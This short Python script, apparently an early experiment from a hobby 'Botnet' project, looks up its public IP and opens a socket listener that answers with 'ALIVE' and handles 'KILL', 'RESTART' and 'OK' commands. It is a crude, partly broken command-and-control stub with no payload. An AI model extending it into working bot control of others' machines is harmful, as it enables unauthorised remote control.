import subprocess
from time import sleep
from threading import Thread
import os
from json import load
from urllib import request
import socket

#subprocess.Popen("/Users/pathik/Desktop/Botnet/build/exe.win32-3.7/bot.exe",creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,close_fds=True)
#print("Process started!")

def test():
    print("Process started!")
    sleep(5)
    file = open("frefref.txt",'w')
    file.close()

    proc = Thread(target=test,args=())
    #proc.setDaemon(True)
    proc.start()

def create_botserver():
    ip = load(request.urlopen("https://api.ipify.org/?format=json"))['ip']
    print("IP : %s"%(ip))
    port = 2000
    ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ss.bind((str(ip),port))
    ss.listen()
    print("Server started")
    while True:
        con,addr = ss.accept()
        print("Connection!")
        con.send("ALIVE".encode())
        resp = con.recv(1024).decode()
        if(resp == "RESTART"):
            pass
        elif(resp == "KILL"):
            quit()
        elif(resp == "OK"):
            continue
        else:
            pass
    
create_botserver()